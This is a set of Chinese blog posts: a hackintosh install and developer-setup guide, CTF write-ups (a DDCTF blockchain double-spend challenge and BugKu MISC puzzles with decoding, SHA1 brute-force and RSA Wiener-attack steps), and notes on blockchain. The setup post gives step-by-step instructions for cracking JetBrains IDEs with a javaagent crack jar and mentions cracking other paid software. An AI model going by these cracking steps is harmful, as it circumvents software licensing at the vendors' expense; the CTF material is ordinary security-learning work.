使用了悦享软件分享的网盘，包含了镜像、工具、EFI大全。 ​ 链接：http://mp.weixin.qq.com/s?__biz=MzIzNjAxMDMzNQ==&amp;mid=100000706&amp;idx=1&amp;sn=5bf4693ac762eae5ca63372bf7fe4c02&amp;chksm=68df2df25fa8a4e4c86fada980c07a8e2c93236e06fc0a710ce3b6049ff04b2260650287731d&amp;mpshare=1&amp;scene=23&amp;srcid=#rd ​ 一开始下载的Majove（10.14），没找到10.14的光影EFI，尝试后发现用光影10.13的EFI不行。只能用High Sierra了,不过真想体验一把10.14的暗黑模式。 ​ - 格式化u盘（u盘必须要大于8G）使用工具TransMac：Formar Disk for Mac把u盘转换成Mac格式，一路默认就行。 ​ - 然后使用Restore with Disk Image把镜像写入u盘。根据u盘的存储速度来看要写入多久。（我用舍友u盘写了一个多小时….然后还不能用….坑…） ​ - 写入完成后，Win系统由于不识别Mac系统文件格式提示把u盘格式化，一定不要确定！否则前面就白费了。 ​ - 然后，根据自己电脑配置或爬帖子找到的成功案例来下载EFI文件。（EFI文件是用来引导系统开机的，下载的黑果EFI包含mac系统的引导工具CLOVER） ​ - 由于目前win无法识别mac文件格式，使用工具：DiskGenius 磁盘管理软件来删除u盘启动盘的/EFI/CLOVER文件夹，然后把我们下载好的EFI里的/CLOVER文件复制进去。（直接ctrl+c、ctrl+v就行） ​ 这样就完成了最重要的一步。 ​ 3.开始安装 - 首先，开机进入BIOS把安全模式关闭（否则CLOVER无法引导开机）。然后打开usb引导开机。保存重启。 ​ - 然后选择macos install。进入，选择中文，临时开启一个macos系统。选择磁盘管理工具，选择要安装的磁盘，然后抹盘（有重要文件要备份！由于之前我win10在128G的ssd上，又不想把mac装在机械上，同时还也不想花钱换ssd..所以，我先把win10移到了机械硬盘然后抹了ssd。。。如果自己是256G的ssd在安装前，先直接分100多G就够用了） ​ - 然后再选择安装。第一次安装重启后在要安装一次。第一次安装设置macos进入系统后，基本完成了80%了。由于自己找的EFI已经可以驱动大部分，就没必要弄了。 ​ 4.后续调整 由于目前是用u盘来引导启动，不能每次都带个u盘来引导开启mac吧。 ​ - 然后，同样用DiskGenius 磁盘管理软件把u盘下的CLOVER文件复制到mac系统下ESP分区的EFI里面。 ​ - 然后，使用工具：EasyUEFI来新建一个开机引导，调整顺序为第一。为保障确实是第一，开机的时候可以进入BIOS看看，再设置一下。 ​ 到此，已经ok了。 ​ 然后本人有强迫症，开机引导多了很多选择，想隐藏没用的。可以在mac下挂载ESP分区，打开clover.efi文件用clover configurator来设置。 ​ 屏幕亮度使用键盘快捷键没法调节，但是可以用鼠标调节，暂时没管（也挺麻烦的，懒得花时间研究了，毕竟无伤大雅）。 ​ 最后，全球问题：网卡无法驱动。淘宝19.9包邮usb无线网卡解决！（苹果原装的内置网卡价格虚高，都100多。不过可以连接蓝牙。我的光影可以驱动蓝牙所以也没必要换内置网卡。） ​ 5.总结一下 虽然总体流程描述起来看似很简单，其实很多步骤都是看了大大大部分资料才明白的。（淘宝安装价格150一台） ​ 目前我的电脑基本90%以上完成度吧。 ​ - 无法解问题：蓝牙不能关闭、独显无法驱动、亮度无法键盘快捷键调节、触摸板部分手势不能用 ​ - 待解决问题：更换内置网卡、改显卡内存、调整字体大小（太小了累眼，改分辨率使字体变大但是模糊..） ​ - 优点：性价比极高、流畅、好用、爽、装x…… ​ - 缺点：不能100%完美、独显废了、不一定稳定、折腾…… ​ - 从win换到mac开始有点不适应…特别是快捷键。（默默掏出快捷键大全背了起来….） ​ 0x03.黑苹果环境配置 1.xcode 直接在appstore下载。 ​ 命令：xcode-select --install安装Xcode Command Line Tools ​ 虽然不开发苹果软件，但其内置了一些基于linux的必要工具。 ​ 2..Homebrew+iTerm2+zsh # 使用系统自带的 ruby 安装 Homebrew /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 不过下载速度10几k，每次都失败。网上找了一堆文章尝试后，终于解决！某国家级大型网络设备真坑！ ​ 链接：https://blog.csdn.net/qq_35624642/article/details/79682979（有两处替换，但是下载的文件只能搜到一处，所以我把第二处替换直接加上尝试竟然成功了…!） ​ 上面文章也包括了更换国内的源，使brew更快。 ​ brew安装上后直接安装一些linux必要的工具或软件： ​ vim、git、node、python3、wget等等有的ios自带了。 ​ 都说iTerm2+zsh牛x，那给我也整一个吧。 ​ 附链接：https://www.cnblogs.com/xishuai/p/mac-iterm2.html ​ 3.IDE安装与破解 我选择JetBrains全套：CLion、Pycharm、PhpStorm、Intellij IDEA、Goland ​ 下载后破解即可。在http://idea.lanyus.com/可获取破解教程（有的方法不行） ​ 尝试一番后，选择了本地破解。本地破解也不算难。由于JetBrains全家桶本地破解流程一样，索性直接把可能会用到的语言IDE全部安装了，省的以后用到再麻烦。（装这么多IDE放桌面，也zhuangb） ​ 本地破解流程： ​ - 1.官网下载，打开dmg文件正常安装，在访达里面找到应用程序，显示包内容 ​ ​ - 2.安装完成后把破解包复制到/Contents/bin文件夹下 ​ ​ - 3.JetBrains全套基于Java开发，打开虚拟机设置文件xxxx.vmoptions，在最后添加一条命令： -javaagent:../bin/JetbrainsIdesCrack-4.2-release.jar ​ - 注：xxx是IDE的名字，添加代码的命令要和自己破解包的名字一样。 ​ ​ - 4.打开IDE，选择Activation code填写上面链接获取的注册码，选择ok破解完成。 ​ ​ 4.开发环境 网上有多种选择： ​ - 1.有IDE，可以直接新建build-in Web Server，即使没有Apache、Nginx就可以本地解析运行。 ​ - 2.mac自带php和apache，只需本地安装数据库（如mysql） ​ 在PhpStorm新建PhpWebPage打开Apache（提前修改配置文件把目录改成自己项目目录），然后在PhpStorm配置好默认路径即可。（也可以用其他文本编辑器） ​ mysql用brew install mysql即可（如果用官方dmg安装还得配置环境（和win配置环境变量一个道理），把文件地址导入到文件即可，bash是~./bash_profile，zsh是~./zshrc） ​ ​ 然后安装Nacicat可视化数据库管理软件来管理数据库。 ​ Nacicat安装与破解链接：https://blog.csdn.net/marswill/article/details/79808416 ​ ​ - 3.docker搭建环境，把本地代码文件映射到docker ​ docker相比来说更加灵活、省空间。但是需要熟悉docker。 ​ docker官网下载免费安装即可。 ​ ​ 总的流程分为三部： ​ - a.编写好各个软件的dockerfile ​ - b.编写好配置文件 ​ - c.通过docker-compose处理所有的dockerfile（包括将配置文件扔进dockerfile文件构建的镜像中） ​ ​ ​ 5.渗透环境 - kali足矣 ​ 6.CTF环境 - kali+mac+win（部分misc工具可能需要）三者切换吧 ​ 7.re或pwn环境 等学了用到再说吧 ​ 8.其他软件 免费，直接AppStore或者官网下载： ​ - 谷歌浏览器（数据同步真好） ​ - Shadowsocks（fq必备） ​ - 有道云笔记（感觉比印象笔记好用） ​ - 有道翻译（好用） ​ - Typora（写md） ​ - FDM（防断点下载，大文件下载断点就GG了） ​ - 百度网盘（限速太恶心了，网上说的Aria2GUI也不行，目前没找到防限速方法） ​ - wps（有时候还是得弄点文件、ppt啥的） ​ - Dr.Cleaner（免费清理工具，时间长了偶尔清理一下） ​ - QQ、微信 ​ ​ 需要破解： ​ - Parallels Desktop（虚拟机软件，kali很流畅！比win用vm爽多了！最牛x的是bootcamp直接可以把我机械硬盘里面的win10开启，注意：在BIOS里面开启虚拟设置） ​ - Sublime text3（主要还是写python或php的脚本和编辑用比较灵活方便） ​ - XMind（画思维导图） ​ - Dash（集成了各个语言和框架的文档手册！程序猿搬砖必备！不过全是英文…）、 ​ - 01Editor（二进制分析工具，打ctf可能会用到） ​ - PS（可能会用到，先安装破解再说） ​ 附mac精选软件链接：https://ihtcboy.com/2018/07/15/2018-07-15_%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84macOS%E7%B3%BB%E5%88%97%EF%BC%9A%E7%B2%BE%E9%80%89MacApp/ 0x04.总结 一天准备一天半安装三天配置，基本一周就过去了。。。以后好好学习，天天向上。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018DDCTF-mini-blockchain分析]]></title>
    <url>%2F2019%2F03%2F07%2F2018ddctf-mini-blockchain-%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[去年的题目，现在仍然开着：http://116.85.48.107:5000/b942f830cf97e/分析一遍代码感觉对区块链又加深了理解。下一步自己尝试写一写题意：银行发行了100W的DDB，黑客append两个区块转给自己99W9999。让我们找回钱并且在商店花200W买两个钻石。1.信息收集：把首页杂乱的信息整理得到信息：创世区块地址银行地址及资金：1黑客地址及资金：999999商店地址及资金：0得到信息：UTXO-1：向黑客地址转资金999999UTXO-2：向银行地址转资金1得到信息：创世区块高度为0，资金100W黑客append空块高度为2得到信息：黑客把银行地址100W资金转到高度为1的区块99W9999，转到银行地址1。留下一句：HAHA, IM THE BANK NOW!2.源码分析注：为了看得更清楚，注释用的//Flask框架,默认url：/b942f830cf97eFLAG()函数，返回GLAG。 查看路由得到信息： /默认路径下展示homepageget_balance_of_all()输出所有账户余额及UTXO，及整个函数返回：创世区块、地址、UTXO、区块链、查看源码的信息/flag路径下，如果你的钻石&gt;=2调用FALG()函数输出flag。否则输出钻石不够要向商店地址转100W才得到一个钻石 /5ecr3t_free_D1diCoin_b@ckD00r/路径下，可以在银行地址向指定地址转账。尝试一下：我们可以在这里知道转账的代码，可以模仿写出自己的转账代码。 /create_transaction路径POST访问创建交易，尝试一下。看来只能用脚本了。。。怪不得题目建议用脚本。然后我们可以看出代码意思：如果商店地址有100W则给你一个钻石，然后立马把商店地址的100W转到商店钱包。 /reset路径,如果把链搞砸了可以重置区块链/source_code路径，可以查看源码 在我们看路由的时候发现了很重要的信息：工作量证明难度要求hash值00000开头 然后审计具体函数：计算参数hash摘要信息。而且是先md5再sha256,更加加固了信息摘要安全性。 哈希运算，我们定位使用该函数的地方，可以看到是python的reduce()函数调用，该函数是对第一个参数(函数)运算后的值与第二个参数运算。在区块链中应该是来更容易计算：父区块hash+本区块hash+随机数reduce函数使用规则可以参考一下链接：http://www.runoob.com/python/python-func-reduce.html定位调用reduce的函数找到，这三个函数直接返回reduce函数的计算值，来计算UTXO、TX、Block的hash值。 来限制格式必须是字典容器模型格式或JSON格式，如果attrs参数中所有值有没在d参数中的则抛出异常。定位一下使用has_attrs()函数的地方:在添加块中要求block必须有三元素：前一区块hash值、nonce值、汇报在交易中必须有：输入、输出、签名在UTXO中必须有：资金数量、地址、id值 所以我们可以知道各个字段的包含关系： 常量hash值，64个0。在计算hash值得时候用到在python中验证一下字符串*数字结果。 地址是N，65537是e，返回地址的私钥d（RSA参数，不懂可百度）来验证。 生成钱包地址(公钥)及私钥。 签名函数，把交易信息用私钥加密得到签名摘要。 创建一个交易输出，参数为目的地址和资金数量 创建一个交易，其中签名为把交易id通过私钥加密 创建一个区块，包括三要素：前一区块hash值、nonce值、汇报。前一区块hash值必须是16进制且限制nonce长度要小于128。查找区块链中最后一个区块,返回其高度？ 获取所有的UTXO信息 计算钱包的余额。默认三个地址都为0，循环累加UTXO中每个地址的资金，返回各个地址的余额。 验证UTXO签名。其实就是rsa的解密过程。签名为密文，地址为公钥，解密算出明文（信息摘要）正确，则证明了是交易人地址验证签名正确。 添加区块，过程略微复杂，主要是验证添加的区块是否满足规范，否则抛出异常。大致过程如下：1.验证三要素。(第三要素”交易”又有输入、输出（输出即UTXO又包含id值、资金数量、地址）、签名)。包括验证输出要小于输入等等可能出现问题的地方。2.创建区块（包含三要素），产生区块hash。保证区块hash值满足规范但又小于difficulty值。3.区块链高度加一，且长度不能超过50。 设置session，有区块和我们的钻石数。首先产生创世区块100W资金，然后银行被黑客添加区块转账99W9999，黑客又添加了空块。 得到所有信息函数。在主页调用了，我们看到的主页信息就是调用了该函数。 3.构造思路由于没有别人来挖矿（添加区块）即我们拥有100%算力。可以结合51%算力攻击，我们可以随意添加区块来改变主链方向。同时也可利用双花攻击来达到双次花费。初始信息：通过append区块把钱找回：同时我们关注代码部分，shop会立即把钱转到shop钱包即目前情况为：那么我们就可以再次分叉来发动双花攻击了。 此时主链已经成为：1-2(2)-3(2)-4(2)-5(3)-6(3)已经覆盖shop把钱转到自己钱包，100W又到了shop所有又获得1个钻石。 4.Payload脚本参考：一叶飘零师傅 获取初始session，抓取主页信息。贴一下源码中的函数及常量，以便我们使用。写好挖矿脚本，爆破遍历nonce满足小于difficulty且’00000’开头添加第一个自己的区块，注意header的构造：添加Content-Type为json。按照思路逐个提交构造的区块，然后再访问/flag目录即可得到falg。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[比特币理论基础笔记]]></title>
    <url>%2F2019%2F02%2F25%2F%E6%AF%94%E7%89%B9%E5%B8%81%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一、概念2008年中本聪发明比特币 1.微观：数字货币，其价值来源于人对其的信任和共识。 2.宏观：去中心化的记账系统二、比特币特点1.财产只受自己控制（银行可以认为你的钱不合法而收缴，而比特币只有自己的私钥控制） 2.无通货膨胀（比特币总量2100万个不变，不会贬值） 3.无假钞（共识机制） 4.流通性好（点对点） 5.不可篡改（去中心化） 6.隐私性（无个人信息） 三、比特币原理1.账本如何验证？ ①与所有人的账本一一核对（效率低，方案不通） ②Hash（上一个区块的Hash+本区块信息），则只需要核对最后一个区块的hash值就可以验证账本 哈希函数：MD5、SHA1、SHA256 哈希函数特点： ①同样原始信息用同一个哈希函数总能得到相同的摘要信息 ②原始信息任何微小的变化都会哈希出面目全非的摘要信息 ③从摘要信息无法逆向推算出原始信息，即单向函数 哈希函数主要用途：验证文件是否被修改 2.账户的所有权问题？ 比特币地址 私钥：谁拥有私钥谁就拥有比特币地址，即拥有支付权 比特币地址和私钥是一个非对称关系，私钥通过hash运算可以得到比特币地址，但是不能通过比特币地址逆向推算私钥。 账户的所有权问题变为：不泄漏私钥的情况下证明拥有某个比特币地址的私钥？答：非对称加密技术 交易签名： ①交易进行hash得到摘要信息 ②用摘要信息和私钥进行签名运算得到签名信息 签名（加密）信息后，再广播签名信息和原始交易记录，再通过非对称密码技术验证（解密），验证通过后添加该区块。 签名就是加密，验证就是解密。 3.为什么记账？（同时也是比特币发行的过程） 记账规则： ①一段时间内只有一个人可以记帐成功 ②通过解决密码学难题（即工作量证明，即挖矿）竞争获得唯一记账权（直接验证hash值谁都可以记账，所以引入工作量证明机制） ③其他节点复制记账结果 工作量证明：通过爆破随机数，找到满足规则随机数后则得到唯一记账权 过程计算量很大，目前已经没有单独矿工挖矿。一般都是矿工组合成矿池，通过算力比来分成收益。过程非常耗电，所以从经济学角度只要有收益就会有矿工加入挖矿，最终会达到挖矿成本接近收益。 交易记录集： ①收集广播中还没有被记录账本的交易 ②交易的有效性验证 ③添加一笔给自己转账的交易（挖矿奖励） 4.两个节点同时完成工作量证明（分叉），使用谁的区块？共识机制（选择累计工作量最大的区块，最长的链为主链） 由于网络不确定性会产生孤块 四、比特币工作流程1.节点分为：①发送节点②接收节点 发送节点在比特币体系里就是用于提交交易信息的用户。接收节点在比特币体系里面就是通常指矿工。 如果有新的交易要提交，那么发送节点就会在比特币网络进行交易信息的广播。矿工则要一直监听比特币网络里是否有交易广播。 2.矿工收到广播的交易信息后，需要校验这个信息的签名等内容是否合法。如果校验通过后，就需要将收到的所有交易信息按照一定的规则组装成一个数据块，也就是区块。 3.刚刚组装的区块还只是在自己这里，还未被纳入比特币网络中正式的区块链中。 如何才能被正式纳入呢？这里就涉及到共识算法了。 因为每个矿工都可能组装了自己的区块，在每10分钟之内，只可能有一个区块被纳入正式区块链，那么所有的矿工就要根据规则在最短的时间内使自己的区块被其它矿工认可，谁最先做到，那么谁的区块就会被正式纳入。 4.能纳入区块链的规则就是共识算法，比特币中使用的共识算法是工作量证明法。即让所有的矿工都去寻找一个随机数，这个随机数是通过Hash算法算出来的，并且算出来的随机数需要满足一定的条件才是大家认可的随机数（需要满足该随机数能使整个区块的哈希值小于目标值），谁先计算/猜到这个随机数，它的区块就能被全网接受。 5.然后这个区块就可以纳入正式区块链，放到链条的最后面，然后各个节点再开始挖下一个区块，就这么一直接连接下去。 6.挖到有效区块的节点可以获得奖励，这个奖励主要有2部分组成： ①比特币体系约定每挖到一个有效区块奖励25比特币。 ②交易手续费。（交易信息的提交节点需要以比特币形式付这一笔交易手续费）]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链理论基础整理]]></title>
    <url>%2F2019%2F02%2F24%2F%E5%8C%BA%E5%9D%97%E9%93%BE%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[一、历史 密码朋克（cypherpunk）（包含很多密码学家大佬） ​ 2008年中本聪发明比特币 ​ 1.微观：数字货币，其价值来源于人对其的信任和共识。 ​ 2.宏观：去中心化的记账系统二、区块链是什么 区块链本质就是一个分布式数据库。（该数据库由一串使用密码学方法产生的数据区块有序链接而成，区块中包含有一定时间内产生的无法被篡改的数据记录信息） ​ 数据库记录的内容可以因应具体的业务而变化，没有特殊的设定。网络上每一个节点都有一个全量的数据库副本，每一个节点都可以写入数据，并将数据同步到其它节点中去。 ​ 区块链之所以叫区块链，是因为它由区块和链表组成。每个区块都包含2部分： 1.区块头 区块头记录了其父区块的哈希值、本区块的哈希值和生成时间等信息。每一个区块的哈希值都是不一样的，根据其区块体的内容和上一个区块的哈希值生成。 2.区块体 区块体记录的就是具体的业务数据。（比特币为例，其区块体记录了比特币网络中发生的每一笔交易数据。） ​ 可以对区块体的内容进行加密，保证数据只公开给有访问权限的人。 ​ 每个区块都有一个父区块的指针，就形成了区块链。 三、区块链能做什么 如果区块链只是一个分布式的数据库。区别于其他数据库，其最大的特点就是去中心化。 ​ 传统的数据库都是主从的模式，读操作在从库完成，写操作都是在主库完成，主库就是一个中心化的库。而区块链在每一个节点都能进行写操作，没有一个中心化的库存在。再结合上文提到的防篡改的特性，区块链有很高的置信度。就算某个节点被黑客攻破，也不会影响到其它节点。而中心化的数据库一旦主库被黑或者被管理员删库，就GG了。 ​ 基于区块链极高的置信度和可靠性，所有交易类的场景都能应用上。目前用的最广泛的就是数字货币。在其它小范围的商业场景下，也会利用区块链做一些商业联盟之间的业务。比如金融行业，保险公司跟银行之间的委托保险买卖业务；供应链各个环节的数据追踪；数字化作品的版权确认等。 四、区块链不能做什么 因为区块链是一个分布式的数据库，就涉及到数据的同步问题。而将新的数据同步到全网是一个非常耗时的过程。以比特币为例，确认一笔交易平均需要1个小时的时间。另外，区块链也不擅长处理高并发的业务。目前来说，其每秒最多也只能并发处理500个请求。所以对于实时性要求高的业务，区块链并不合适。 五、区块链特性1.去中心化 区块链在每一个节点都能进行写操作，没有一个中心化的库存在。 2.不可伪造3.不可篡改 由于各个区块根据区块的哈希值串联起来，而区块的哈希值是根据区块体的内容和上一个区块的哈希值而生成的。一旦对区块的内容进行了更改，哈希值就会改变。这会导致它子区块的哈希值会跟着变，一直传导到各个子孙区块。如果没有51%的节点配合，这种篡改是不可能生效的。 4.不可复制5.匿名6.基于密码学7.分布式8.可溯源9.账本公开 六、区块链缺点1.效率 数据写入区块链，最少要等待十分钟，所有节点都同步数据，则需要更多的时间。 2.能耗 区块的生成需要矿工进行无数无意义的计算，非常耗费能源。 ​ 因此，区块链的适用场景，其实非常有限。 ​ 1.不存在所有成员都信任的管理当局 ​ 2.写入的数据不要求实时使用 ​ 3.挖矿的收益能够弥补本身的成本 七、区块链类型根据网络范畴：1.共有链 特点：完全对外开放，任何人都可以任意使用，没有权限的限定，没有身份认证，不但可以任意参与使用，而且发生的所有数据都可以任意查看，完全公开透明。 ​ 例子：比特币、EOS、eth、NEO 2.私有链 特点：不对外开放，仅在组织内部使用。需要提交身份认证，而且具备一套权限管理体系。 ​ 例子：企业的票据管理、财务审计、供应链管理 3.联盟链 特点：联盟链的网络范围结余共有链和私有链之间，通常是使用在多个成员角色的环境下。往往由不同权限的成员 参与，一般也是具有身份认证和权限设置。 ​ 例子：R3CV、IBM farbric、 4.主流项目根据部署环境：1.主链 最长的链。部署在生产环境中真正的区块链系统，只有主链才会真正被推广使用，各项功能的设计都相对完善。 2.测试链 测试用，可更改算法测试。 根据对接类型：1.单链 能够单独运行的区块链系统 2.侧链 将不同的链结合起来的区块链。侧链能起到一个对主链功能扩展的作用，很多在主链中不方便实现的功能可以在侧链中实现，而侧链再通过与主链数据交互增强自己的可靠性。 3.互联链 各个区块链互联。类似互联网。 八、区块链架构v1.0 比特币 ​ v2.0 以太坊、智能合约、eth（主要与金融领域结合） ​ v2.0最大的特点就是支持智能合约。在以太坊中，使用智能合约开发工具开发合约程序，并且编译为字节码，最终部署到以太坊的区块链账本中。部署后的智能合约是运行在虚拟机上的，成为“以太坊虚拟机”。正式通过这样的智能合约的实现，扩展了区块链系统的功能。 v3.0 社会、物联网、存储（区块链与各个行业融合） ​ 超越了对数字货币或者金融的应用范畴，而将区块链技术作为一种泛解决方案，可以在其他领域使用，比如行政管理、文化艺术、企业供应链、医疗健康、物联网、产权登记等，可以认为是面向行业应用。 ​ 行业应用一般是需要具备企业级属性（比如身份认证、许可授权、加密传输等）并且对数据的处理性能也会有要求，因此企业级场景下的应用，往往都是联盟链或者私有链。 九、区块链协议分层6.应用层 转账和记账等功能 5.合约层 基本代码 ​ 算法机制 ​ 智能合约 4.激励机制 发行机制 ​ 分配机制 3.共识层 POW ​ POS ​ DPOS ​ DBFT ​ 其他 2.网络层 p2p网络 ​ 传播机制 ​ 验证机制 1.数据层 区块数据 ​ 链式结构 ​ 数字签名 ​ 哈希函数 ​ Merkel树 ​ 非对称加密 十、区块链工作流程步骤1.发送节点将新的数据记录向全网广播2.接收节点对收到的数据记录信息进行检验，比如记录信息是否合法，通过检验后，数据记录将被纳入一个区块中3.全网所有的接收节点对区块执行共识算法（有工作量证明法、权益证明法等）4.区块通过共识算法过程后被正式纳入区块链中存储，全网节点均表示接受该区块，而表示接受的方法，就是将该区块的随机散列值视为最新的区块散列值，新区块的制造者将以区块链为基础进行延长 比特币为例： ​ 1.节点分为：①发送节点②接收节点 发送节点在比特币体系里就是用于提交交易信息的用户。接收节点在比特币体系里面就是通常指矿工。 如果有新的交易要提交，那么发送节点就会在比特币网络进行交易信息的广播。矿工则要一直监听比特币网络里是否有交易广播。 ​ 2.矿工收到广播的交易信息后，需要校验这个信息的签名等内容是否合法。如果校验通过后，就需要将收到的所有交易信息按照一定的规则组装成一个数据块，也就是区块。 ​ 3.刚刚组装的区块还只是在自己这里，还未被纳入比特币网络中正式的区块链中。 如何才能被正式纳入呢？这里就涉及到共识算法了。 因为每个矿工都可能组装了自己的区块，在每10分钟之内，只可能有一个区块被纳入正式区块链，那么所有的矿工就要根据规则在最短的时间内使自己的区块被其它矿工认可，谁最先做到，那么谁的区块就会被正式纳入。 ​ 4.能纳入区块链的规则就是共识算法，比特币中使用的共识算法是工作量证明法。即让所有的矿工都去寻找一个随机数，这个随机数是通过Hash算法算出来的，并且算出来的随机数需要满足一定的条件才是大家认可的随机数（需要满足该随机数能使整个区块的哈希值小于目标值），谁先计算/猜到这个随机数，它的区块就能被全网接受。 ​ 5.然后这个区块就可以纳入正式区块链，放到链条的最后面，然后各个节点再开始挖下一个区块，就这么一直接连接下去。 ​ 6.挖到有效区块的节点可以获得奖励，这个奖励主要有2部分组成： ​ ①比特币体系约定每挖到一个有效区块奖励25比特币。 ​ ②交易手续费。（交易信息的提交节点需要以比特币形式付这一笔交易手续费） 十一、区块链应用1.资产：数字资产发行、支付（跨境支付）、交易、结算2.记账：股权交易、供应链金融、商业积分3.不可篡改：溯源、众筹、医疗证明、存在性证明4.点对点：共享经济、物联网5.隐私：匿名交易 十二、区块链的安全问题1.区块链安全是因为其不可更改特性和分布式特性。 即如果要修改区块链中的数据，必须完成下面两件事情： ​ ①你需要计算出修改区块之后的所有区块的哈希值，这需要非常庞大的计算能力。 ​ ②你需要让超过50%的区块链用户同意你的修改。同时完成上面两件事情在短时间（甚至较长时间）内基本上是不可能的，所以区块链很安全。 2.51%攻击 举个例子： ​ 假设我具备了全网51%的算力，那么我可以偷偷的计算出一个这样的区块链，包含所有的比特币交易到我的私人账户的信息。这个区块链的长度为10，但是我不向全网进行广播。同时，我将所有的比特币放入到交易市场进行售卖。这笔交易记录在正常的区块链中。 ​ 当我交易所得美元进行提取时，正常的区块链长度应该是9。而我的隐藏的区块链长度是10，同时，将这个区块链广播到网络中去，然后通过观察网络会认为我后发的区块是正确的，从而到达修改了那笔交易记录的目的。 3.双花问题 何为双花问题？从表意上来说，就是一个人在同一时间进行了两笔交易。这个问题，一直是支付系统的难点。无论是中心化的支付系统，还是去中心化的交易系统，都得面对这个问题。 ​ 举个例子： ​ 某人手里有20块钱。他同时与两个人进行了一笔20块钱的交易。现实生活中，你可以明确地发现问题。但是，相对于支付系统而言，并发的情况经常发生。一旦一个不完善的支付系统，双花问题是很容易发生的。当然，后端处理过程中，可以通过队列的形式来解决问题。但是，对于去中心化的交易系统而言，这个问题也需要解决。 每一笔交易的产生，都会产生一个区块，那么，往往会发现这么一种情况，如图： 我们可以看到，Block A和Block B就会同时去连接上一个区块。那么，相对于这个问题，比特币系统采用的规则就是选最长的那条链。通常，比特币采用的是6次确认规则。在1小时内，根据10分钟产生一个区块的原则，往往会生成一条6个长的区块。那么，只要确认下这条区块，就可以避免去连接其他区块了。 ​ 理论上是，区块链越长，准确性越高。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Think PHP框架漏洞梳理]]></title>
    <url>%2F2019%2F02%2F24%2FThink%20PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[文章发在SKSEC公众号：【表哥有话说 第27期】文章链接：https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&amp;mid=2247484044&amp;idx=1&amp;sn=8cfa3b32f3ef13de16beebd4a9256910&amp;chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&amp;mpshare=1&amp;scene=23&amp;srcid=#rd 欢迎大家关注SKSEC！]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu-MISC-WP史诗全集]]></title>
    <url>%2F2018%2F12%2F10%2FBugKu-MISC-WP%E5%8F%B2%E8%AF%97%E5%85%A8%E9%9B%86%2F</url>
    <content type="text"><![CDATA[一、信息收集与社工1.签到微信扫面二维码回复：flag得flag。2.猜提示是某人姓名全拼音，运用谷歌识图搜到是liuyifei。二、编码分析1.多种方法解决用NotePad++打开发现是python的b64img模块把图片转换成文本的文本。直接在线还原base64编码的图片的二维码，扫面得flag2.普通的二维码 扫码说：flag就在这里。各种分析方法发现都没用。最后在文本最后发现一串数字 没有8，应该是八进制然后把八进制转换成字符应该是flag，每三个数字一组写个脚本。 c = ‘146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175’flag = ‘’for i in xrange(0,126,3): flag += chr(int(c[i:i+3],8)) print flag 运行脚本得到flag 3.convert 写个脚本把二进制转换成字符存到一个新文件 import libnum​file = open(‘1.txt’,’r’)​f = file.read()c = f.replace(‘\r\n’,’’)m = libnum.b2s(c)print m​getflag = open(‘flag’,’wb’)getflag.write(m)file.closegetflag.closeprint ‘ok！！！’ 在linux里面直接检查到文件格式为rar 解压图片查看exif找到base64字符，python解码base64即可得flag 4.就五层你能解开吗 感觉这个题目多为密码题，就放这里吧… 给出了提示：第一层为CRC32碰撞 打开压缩包可以看见CRC32校验码分别为：0x7c2df918、0xa58a1926、0x4dad5967分别爆破 把有意义的连接起来得到解压密码：_CRC32_i5_n0t_s4f3 第二层为维吉尼亚密码，给出了key和Hint。但是KEY有点多 看网上有人说猜测开头字母可能是什么然后猜是the，对应开头秘钥为YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV解密找到秘密 第三层SHA1碰撞 上python脚本 #encoding:utf-8import stringimport hashlib​keys = string.ascii_letters + string.digits + string.punctuation​def sha1(s):• sha1_hash = hashlib.sha1()• sha1_hash.update(s)• return sha1_hash.hexdigest()​for i in keys:• for j in keys:• for p in keys:• for q in keys:• password = i + ‘7’ + j + ‘5-‘ + p + ‘4’ + q + ‘3?’• sha = sha1(password.encode(‘utf-8’))• if sha[0:7] == ‘619c20c’ and sha[8] == ‘a’ and sha[16] == ‘9’:• print(password) 得到解压密码 第四层md5相同文件不同 百度就能找到HelloWorld-colliding.exe和GoodbyeWorld-colliding.exe两个文件不同但是md5值相同。得到解压密码：Goodbye World :-( 第五层RSA解密 得到两个文件.enc和.pem 解法一：直接用RSA-Tool快速解题 解法二： 用Openssl提取N和E，发现都很大。应该是维纳攻击（低解密指数攻击） 然后用Wienerattack攻击的脚本跑一下得到d=8264667972294275017293339772371783322168822149471976834221082393409363691895 然后用python的rsatool生成私钥。这里有个问题，脚本比较老用的gmpy。而我不知道为何始终没有解决安装老的gmpy库，最后是把脚本里面的gmpy全部改成gmpy2就好了。 用Openssl和私钥解密得到flag openssl rsautl -decrypt -in flag.enc -inkey key.pem -out flag.txt 三、取证隐写(一)、图片隐写1.这是一张单纯的图片 用NotePad++打开发现最后附加了一段Unicode编码。解码得flag 2.隐写 PNG图片，NotePad++打开后发现有一段IHDR字样。 猜测是利用Window忽略CRC检验码然后修改高度和宽度后仍然可以显示来隐藏信息。 然后我们放到Kali 